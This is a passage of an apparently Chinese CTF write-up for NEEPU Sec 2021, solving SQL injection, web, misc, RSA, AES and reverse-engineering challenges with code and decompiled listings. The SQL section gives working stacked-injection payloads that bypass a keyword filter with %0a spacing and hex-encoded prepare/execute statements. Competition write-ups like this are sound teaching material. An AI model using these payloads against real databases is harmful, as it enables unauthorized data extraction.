class="string">&#x27;success&#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;Neepu&#123;&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(i+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">html = r.text</span><br><span class="line">start = html.index(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="built_in">len</span>(<span class="string">&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red;  font-size: 70&quot;&gt;&lt;/div&gt;&#x27;</span>)+<span class="number">8</span></span><br><span class="line">end = start+html[start:].index(<span class="string">&#x27;&amp;nbsp=&amp;nbsp?&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="随便注2-0"><a href="#随便注2-0" class="headerlink" title="随便注2.0"></a>随便注2.0</h3><blockquote><p>如果我告诉你网上有原题，你能做的出来吗?</p><p>百度/谷歌搜索: [强网杯 2019]随便注</p></blockquote><p>强网杯2019 随便注原题魔改，堆叠注入，照着来。</p><p><code>1&#39; union select 1,2,database()#</code> 得到过滤规则 <code>return preg_match(&quot;/select|update|delete|drop|insert|where|rename|set|handler|char|\*| |    |\./i&quot;,$inject);</code></p><p>空格用<code>%0a</code>代替，尝试堆叠注入：</p><p><code>0&#39;;show%0adatabases;#</code> 得到数据库名：ctftraining, information_schema, mysql, performance_schema, supersqli, test</p><p><code>0&#39;;show%0atables;#</code> 得到表名：@Neepu2021招新赛, words</p><p><code>0&#39;;desc%0a`@Neepu2021招新赛`;#</code> 得到列名：flag, NO</p><p>原题有<strong>重命名法</strong>和<strong>预处理法</strong>可得flag，这里<code>rename</code>和<code>set</code>被禁，可用<strong><code>prepare</code> 预处理+<code>execute</code> 执行</strong>的方法，构造<code>select flag from `@Neepu2021招新赛` </code>16进制字符串，代入预处理语句拿flag：</p><p><code>1&#39;;prepare%0axxx%0afrom%0a0x73656c65637420666c61672066726f6d2060404e6565707532303231e68b9be696b0e8b59b60;execute%0axxx;#</code></p><p>​    </p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="remote-table"><a href="#remote-table" class="headerlink" title="remote_table"></a>remote_table</h3><blockquote><p>这真的是远程桌面吗?或许吧…</p></blockquote><p>翻一圈源码，在<code>notfound.html</code>找到flag。</p><p>​    </p><h3 id="LOVE-DEATH-amp-ROBOTS"><a href="#LOVE-DEATH-amp-ROBOTS" class="headerlink" title="LOVE_DEATH&amp;ROBOTS"></a>LOVE_DEATH&amp;ROBOTS</h3><blockquote><p>Beauty and danger coexist, and the magnificence, weirdness, and extraordinary view of the world often lie in peril, and human beings are rare, so people who do not have aspirations cannot come.</p></blockquote><p>根据标题ROBOTS，容易想到<code>robots.txt</code>，访问发现<code>/n33pvfl4g.php</code>，再访问<code>n33pvfl4g.php</code>得flag。</p><p>​    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="15-Puzzle"><a href="#15-Puzzle" class="headerlink" title="15 Puzzle!"></a>15 Puzzle!</h3><blockquote><p>You can do it!</p></blockquote><p>手拼就是了，拼完有flag。</p><p>​    </p><h3 id="龙会说话？"><a href="#龙会说话？" class="headerlink" title="龙会说话？"></a>龙会说话？</h3><blockquote><p>龙会聊天吗？</p></blockquote><p>第一层，一个文件 dragon 和一个加密压缩包 dragon’s talk.rar。</p><p>010editor查看 dragon，发现尾部<code>49454E44AE426082</code>是png文件尾，查找文件头<code>89504E47</code>，分离出png图片：</p><p><img src="/match-NEEPU-Sec-2021公开赛/image-20210524204117861.png" alt="image-20210524204117861"></p><p>找到<a href="https://www.dcode.fr/draconic-dragon-language">龙语解码工具</a>，解出<code>youseethedragon</code>为rar密码。</p><p>第二层，一个 dragon’s talk.wav 文件。</p><p>用audacity未发现什么信息，尝试LSB隐写，用<a href="https://silenteye.v1kings.io/">Silenteye</a>无密码得到隐藏文件flag.txt。</p><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><blockquote><p>Just RSA!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span> (<span class="params">p1,p2,e</span>):</span></span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;Neepu&#123;********************&#125;&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = nextprime(random.randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = encode(p, q, e)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, <span class="number">7</span>, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+e, <span class="number">7</span>, n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;</span></span><br><span class="line"><span class="string">&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;</span></span><br><span class="line"><span class="string">&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;</span></span><br><span class="line"><span class="string">&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>两部分：</p><p>第一部分 $n=pq,c=\text{flag}^e \bmod n$，</p><p>第二部分 $m=\text{enc}(p,q,e),c_1=m^7 \bmod n,c_2=(m+e)^7 \bmod n$。</p><p>先解第二部分，利用Related Message Attack求解 $m$，由于 $e$ 未知且 $e&lt;1010$，爆破 $e$ 求出 $m$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">c1, c2, n, e</span>):</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = (x)^<span class="number">7</span> - c1</span><br><span class="line">    g2 = (x+e)^<span class="number">7</span> - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">c1 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">c2 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    m = attack(c1, c2, n, e)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(m,<span class="number">7</span>,n) == c1:</span><br><span class="line">            <span class="built_in">print</span>((e,m))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#结果：(71, 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859)</span></span><br><span class="line"><span class="comment">#e = 71</span></span><br><span class="line"><span class="comment">#m = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br></pre></td></tr></table></figure><p>又 $m=\text{enc}(p,q,e)$，即 $eS=ed \equiv 1 \pmod {(p+1)(q+1)},dp=S \bmod (p+1)=d \bmod (p+1)$，</p><p>由于 $e \cdot dp \equiv e \cdot d \equiv 1 \pmod {(p+1)}$，有 $e \cdot dp-1=k \cdot (p+1)$，</p><p>比较 $e \cdot dp$ 与 $p$ 比特位数相近，故 $k$ 值不大，</p><p>爆破 $k$，当同时满足 $(e \cdot dp-1) \bmod k =0$ 和 $n \bmod \Big(\cfrac{e \cdot dp-1}{k}-1\Big)$ 时，$n$ 成功分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">dp = <span class="number">129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859</span></span><br><span class="line">e = <span class="number">71</span></span><br><span class="line">c = <span class="number">78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> (e*dp-<span class="number">1</span>)%k == <span class="number">0</span>:</span><br><span class="line">        p = (e*dp-<span class="number">1</span>)//k-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            q = n//p</span><br><span class="line">            <span class="built_in">print</span>((k,p,q))</span><br></pre></td></tr></table></figure><p>最后常规RSA求得flag。</p><p>​    </p><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><blockquote><p>简单的AES</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = os.urandom(<span class="number">18</span>)</span><br><span class="line">flag_enc = os.urandom(<span class="number">45</span>)</span><br><span class="line">pad = <span class="string">b&#x27;a&#x27;</span> * <span class="number">12</span> + <span class="string">b&#x27;Neepu&#123;&#x27;</span></span><br><span class="line">flag_enc = pad+flag_enc+<span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">masg1 = flag_enc[<span class="number">0</span>:<span class="number">32</span>]</span><br><span class="line">masg2 = flag_enc[<span class="number">32</span>: ]</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(masg1)^bytes_to_long(masg2)</span><br><span class="line">key = os.urandom(<span class="number">2</span>)*<span class="number">16</span></span><br><span class="line">iv = masg2[<span class="number">16</span>:][:<span class="number">16</span>]</span><br><span class="line"><span class="built_in">print</span>(bytes_to_long(key)^bytes_to_long(iv))</span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">enc_flag = aes.encrypt(long_to_bytes(m))</span><br><span class="line"><span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="string">b&#x27;\xd8\x83\xfd\x89\xc3+\x11\xb8g\xd2\xf5k\xeeU\x88\xb5\xde\x8bq\x9bC\xab\xe3K2R&lt;\xaa\xbc\x92H\x19&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>先看<code>flag_enc</code>由64字符构成，已知前18字符 <code>aaaaaaaaaaaaNeepu&#123;</code> 和后1字符 <code>&#125;</code> 。</p><p>拆半分别为前32字符 <code>masg1</code> 和后32字符 <code>masg2</code>，异或值 <code>m = masg1^masg2</code>，</p><p>通过AES-CBC加密，key形如 <code>xyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxy</code>，iv为 <code>masg2</code> 后16字符，已知 <code>key^iv</code>。</p><p>从key入手，key只有两位未知，爆破key值，同时得到iv值，利用<strong>iv值16位</strong>和最后1位字符为<code>&#125;</code>，得到key和iv值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tmp=<span class="number">111074535590201916919246051309547040927554959486196038152130336189953949145068</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">key = <span class="built_in">bytes</span>([i,j])*<span class="number">16</span></span><br><span class="line">iv = long_to_bytes(tmp^bytes_to_long(key))</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(iv) == <span class="number">16</span> <span class="keyword">and</span> iv[-<span class="number">1</span>] == <span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#iv: b&#x27;fefcsukobhmtfhb&#125;&#x27;</span></span><br><span class="line"><span class="comment">#key: b&#x27;\xf5\x91&#x27;*16</span></span><br></pre></td></tr></table></figure><p>由key和iv值+密文 <code>enc</code> 解出 <code>m</code>。</p><p>此时，前32字符 <code>masg1</code> 已知前16字符<code>aaaaaaaaaaaaNeep</code>，后32字符 <code>masg2</code> 已知后16字符 <code>fefcsukobhmtfhb&#125;</code>，根据 <code>m = masg1^masg2</code> 分别异或得到另一半：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">iv = <span class="string">b&#x27;fefcsukobhmtfhb&#125;&#x27;</span></span><br><span class="line">key = <span class="string">b&#x27;\xf5\x91&#x27;</span>*<span class="number">16</span></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">m = aes.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">masg1 = (<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + <span class="string">b&#x27;Neep&#x27;</span>) + long_to_bytes(bytes_to_long(iv)^bytes_to_long(m[<span class="number">16</span>:]))</span><br><span class="line">masg2 = long_to_bytes(bytes_to_long(<span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span>+<span class="string">b&#x27;Neep&#x27;</span>)^bytes_to_long(m[:<span class="number">16</span>])) + iv</span><br><span class="line">flag_enc = masg1 + masg2</span><br><span class="line"></span><br><span class="line"><span class="comment">#aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125;</span></span><br></pre></td></tr></table></figure><p>发现代码里 <code>flag</code> 和 <code>flag_enc</code> 无直接关联，观察 <code>flag_enc</code>为键盘加密，解密得 <code>flag</code>：<code>Neepu&#123;are-you-kidding&#125;</code>。  </p><p>​    </p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="OLLEH"><a href="#OLLEH" class="headerlink" title="OLLEH"></a>OLLEH</h3><blockquote><p>!ni ngis ER laeR</p><p>hint: 师傅们如果做出来了请将flag框架改为Neepu{}，给师傅们带来不便，非常抱歉</p></blockquote><p>IDA，<code>main()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">_main();</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="keyword">char</span> *)v20, <span class="string">&quot;416:99A:77&quot;</span>);       <span class="comment">//字符串v20 = 416:99A:77</span></span><br><span class="line">v20[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">LOBYTE(v20[<span class="number">7</span>]) = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="keyword">sizeof</span>(v14));</span><br><span class="line">v14[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">v14[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">2</span>; i &lt;= <span class="number">19</span>; ++i )               <span class="comment">//v14 = 长度20的斐波那契数列</span></span><br><span class="line">  v14[i] = v14[i - <span class="number">2</span>] + v14[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )                <span class="comment">//v20按 (斐波那契数列值 &amp; 0xF) 移位，存入v4 = 3047414550</span></span><br><span class="line">  *(&amp;v4 + i) = *((<span class="keyword">char</span> *)v20 + i) - (v14[i] &amp; <span class="number">0xF</span>);</span><br><span class="line">v17[<span class="number">0</span>] = <span class="string">&#x27;OLLEH&#x27;</span>;                         <span class="comment">//v17 = HELLO</span></span><br><span class="line">v17[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">v18 = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(v15, <span class="string">&quot;flag&#123;world_Vjea&#125;&quot;</span>);          <span class="comment">//v15 = flag&#123;world_Vjea&#125;</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">4</span>; ++j )</span><br><span class="line">  v16[j] = *((_BYTE *)v17 + j);           <span class="comment">//v16[0:5] = v17[0:5] = HELLO</span></span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">5</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  v16[j] = v15[j];                        <span class="comment">//v16[5:10] = v15[5:10] = world</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Welcome to the 2021 NEEPUCTF&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Now you can enjoy it&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Please input right number:&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">v21 = <span class="built_in">strlen</span>(Str);</span><br><span class="line"><span class="keyword">if</span> ( v21 != <span class="number">10</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v4 == Str[<span class="number">0</span>]</span><br><span class="line">  &amp;&amp; v5 == Str[<span class="number">1</span>]</span><br><span class="line">  &amp;&amp; v6 == Str[<span class="number">2</span>]</span><br><span class="line">  &amp;&amp; v7 == Str[<span class="number">3</span>]</span><br><span class="line">  &amp;&amp; v8 == Str[<span class="number">4</span>]</span><br><span class="line">  &amp;&amp; v9 == Str[<span class="number">5</span>]</span><br><span class="line">  &amp;&amp; v10 == Str[<span class="number">6</span>]</span><br><span class="line">  &amp;&amp; v11 == Str[<span class="number">7</span>]</span><br><span class="line">  &amp;&amp; v12 == Str[<span class="number">8</span>]</span><br><span class="line">  &amp;&amp; v13 == Str[<span class="number">9</span>] )                       <span class="comment">//Str == v4</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;OK,FLAG is  NEEPU&#123;MD5&#123;%s%d%d%d%d%d&#125;&#125;&quot;</span>, v16, v4, v5, v6, v7, v8);</span><br><span class="line">  getchar();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;byebye&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>按代码逻辑，拼接得 <code>v16 = HeLLOworld</code>，<code>v4~v8 = 30474</code>，由于 <code>v4~v8</code> 格式化输出为 <code>%d</code>，转化为对应ASCII值。</p><p>flag得到：<code>Neepu&#123;md5(HeLLOworldworld5148525552)&#125;</code></p><p>​    </p><h3 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h3><blockquote><p>ezRE, wryyyyy~</p></blockquote><p>两个文件，easyre.dll 和 easyre.exe。</p><p>exeinfope查看easyre.dll，发现是.NET程序，上ILSpy：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// retest.Program</span></span><br><span class="line">internal <span class="class"><span class="keyword">class</span> <span class="title">Program</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string text = <span class="string">&quot;mT0b&quot;</span>;</span><br><span class="line">string text2 = <span class="string">&quot;D&#123;0S&quot;</span>;</span><br><span class="line">string text3 = <span class="string">&quot;Dg9E&quot;</span>;</span><br><span class="line">string text4 = <span class="string">&quot;OD_&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">char</span>[] array = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span>[] array2 = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span>[] array3 = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">char</span>[] array4 = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">4</span>];</span><br><span class="line">array[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">array[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">array[<span class="number">2</span>] = text3.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">array[<span class="number">3</span>] = text4.<span class="built_in">get_Chars</span>(<span class="number">0</span>);</span><br><span class="line">array2[<span class="number">0</span>] = text.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span class="line">array2[<span class="number">1</span>] = text2.<span class="built_in">get_Chars</span>(<span class="number">1</span>);</span><br><span 